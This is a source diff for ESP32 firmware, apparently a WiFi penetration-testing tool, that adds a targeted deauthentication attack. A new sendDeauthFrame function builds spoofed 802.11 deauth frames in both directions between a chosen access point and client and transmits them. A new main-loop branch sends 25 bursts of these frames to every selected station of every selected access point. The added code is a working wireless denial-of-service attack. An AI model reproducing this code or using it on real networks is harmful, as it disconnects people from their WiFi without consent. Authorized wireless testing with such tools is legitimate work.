@@ -324,6 +324,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
     this->startWiFiAttacks(scan_mode, color, text_table4[8]);
   else if (scan_mode == WIFI_ATTACK_DEAUTH_MANUAL)
     this->startWiFiAttacks(scan_mode, color, text_table4[8]);
+  else if (scan_mode == WIFI_ATTACK_DEAUTH_TARGETED)
+    this->startWiFiAttacks(scan_mode, color, text_table4[47]);
   else if (scan_mode == WIFI_ATTACK_AP_SPAM)
     this->startWiFiAttacks(scan_mode, color, " AP Beacon Spam ");
   else if (scan_mode == BT_SCAN_ALL) {
@@ -463,6 +465,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == WIFI_ATTACK_AUTH) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) ||
+  (currentScanMode == WIFI_ATTACK_DEAUTH_TARGETED) ||
   (currentScanMode == WIFI_ATTACK_MIMIC) ||
   (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
   (currentScanMode == WIFI_PACKET_MONITOR) ||
@@ -2354,24 +2357,6 @@ void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t 
   }
 }
 
-/*
-void WiFiScan::broadcastAPBeacon(uint32_t currentTime, AccessPoint custom_ssid) {
-  set_channel = random(1,12); 
-  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
-  delay(1);
-
-  // Randomize SRC MAC
-  packet[10] = packet[16] = custom_ssid.bssid[0];
-  packet[11] = packet[17] = custom_ssid.bssid[1];
-  packet[12] = packet[18] = custom_ssid.bssid[2];
-  packet[13] = packet[19] = custom_ssid.bssid[3];
-  packet[14] = packet[20] = custom_ssid.bssid[4];
-  packet[15] = packet[21] = custom_ssid.bssid[5];
-
-  char ESSID[custom_ssid.essid.length() + 1] = {};
-  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);
-}*/
-
 void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid) {
   set_channel = random(1,12); 
   esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
@@ -2636,6 +2621,70 @@ void WiFiScan::sendProbeAttack(uint32_t currentTime) {
       packets_sent = packets_sent + 3;
     }
   }
+}
+
+void WiFiScan::sendDeauthFrame(int bssid[6], int channel, uint8_t mac[6]) {
+  WiFiScan::set_channel = channel;
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  delay(1);
+  
+  // Build AP source packet
+  deauth_frame_default[4] = mac[0];
+  deauth_frame_default[5] = mac[1];
+  deauth_frame_default[6] = mac[2];
+  deauth_frame_default[7] = mac[3];
+  deauth_frame_default[8] = mac[4];
+  deauth_frame_default[9] = mac[5];
+  
+  deauth_frame_default[10] = bssid[0];
+  deauth_frame_default[11] = bssid[1];
+  deauth_frame_default[12] = bssid[2];
+  deauth_frame_default[13] = bssid[3];
+  deauth_frame_default[14] = bssid[4];
+  deauth_frame_default[15] = bssid[5];
+
+  deauth_frame_default[16] = bssid[0];
+  deauth_frame_default[17] = bssid[1];
+  deauth_frame_default[18] = bssid[2];
+  deauth_frame_default[19] = bssid[3];
+  deauth_frame_default[20] = bssid[4];
+  deauth_frame_default[21] = bssid[5];      
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+  packets_sent = packets_sent + 3;
+
+  // Build AP dest packet
+  deauth_frame_default[4] = bssid[0];
+  deauth_frame_default[5] = bssid[1];
+  deauth_frame_default[6] = bssid[2];
+  deauth_frame_default[7] = bssid[3];
+  deauth_frame_default[8] = bssid[4];
+  deauth_frame_default[9] = bssid[5];
+  
+  deauth_frame_default[10] = mac[0];
+  deauth_frame_default[11] = mac[1];
+  deauth_frame_default[12] = mac[2];
+  deauth_frame_default[13] = mac[3];
+  deauth_frame_default[14] = mac[4];
+  deauth_frame_default[15] = mac[5];
+
+  deauth_frame_default[16] = mac[0];
+  deauth_frame_default[17] = mac[1];
+  deauth_frame_default[18] = mac[2];
+  deauth_frame_default[19] = mac[3];
+  deauth_frame_default[20] = mac[4];
+  deauth_frame_default[21] = mac[5];      
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+  packets_sent = packets_sent + 3;
 }
 
 void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str) {
@@ -3506,6 +3555,43 @@ void WiFiScan::main(uint32_t currentTime)
         display_obj.showCenterText(displayString, 160);
       #endif
       packets_sent = 0;
+    }
+  }
+  else if (currentScanMode == WIFI_ATTACK_DEAUTH_TARGETED) {
+    // Loop through each AP
+    for (int x = 0; x < access_points->size(); x++) {
+      // Only get selected APs
+      if (access_points->get(x).selected) {
+        AccessPoint cur_ap = access_points->get(x);
+        // Loop through each AP's Station
+        for (int i = 0; i < cur_ap.stations->size(); i++) {
+          // Only get selected Stations
+          if (stations->get(cur_ap.stations->get(i)).selected) {
+            Station cur_sta = stations->get(cur_ap.stations->get(i));
+
+            // Send deauths for each selected AP's selected Station
+            for (int y = 0; y < 25; y++)
+              this->sendDeauthFrame(cur_ap.bssid, cur_ap.channel, cur_sta.mac);
+
+            // Display packets sent on screen
+            if (currentTime - initTime >= 1000) {
+              initTime = millis();
+              String displayString = "";
+              String displayString2 = "";
+              displayString.concat(text18);
+              displayString.concat(packets_sent);
+              for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
+                displayString2.concat(" ");
+              #ifdef HAS_SCREEN
+                display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+                display_obj.showCenterText(displayString2, 160);
+                display_obj.showCenterText(displayString, 160);
+              #endif
+              packets_sent = 0;
+            }
+          }
+        }
+      }
     }
   }
   else if ((currentScanMode == WIFI_ATTACK_MIMIC)) {
